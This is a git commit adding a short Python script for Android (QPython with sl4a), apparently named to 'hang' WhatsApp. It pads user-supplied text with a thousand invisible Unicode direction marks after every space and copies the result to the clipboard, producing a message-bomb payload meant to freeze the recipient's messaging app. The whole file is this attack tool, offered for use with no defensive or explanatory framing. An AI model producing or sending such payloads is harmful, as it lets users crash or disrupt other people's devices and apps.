58e804751c26f1abbf85df55a9ea5697f37c2d29
QiubyZ <41333888+QiubyZ@users.noreply.github.com>
2018-07-18 16:49:54 +0700

    Add files via upload

---
+++ HANGwhstapp.py
@@ -0,0 +1,13 @@
+#coding:utf8
+#qpy:3
+#qpy:console
+
+import sl4a
+text = input("Text: ")
+def pesan(t):
+    droid = sl4a.Android()
+    p = "\u200e\u200f" * 1000
+    droid.setClipboard(t.replace(" "," "+p))
+if __name__=="__main__":
+    pesan(text)
+
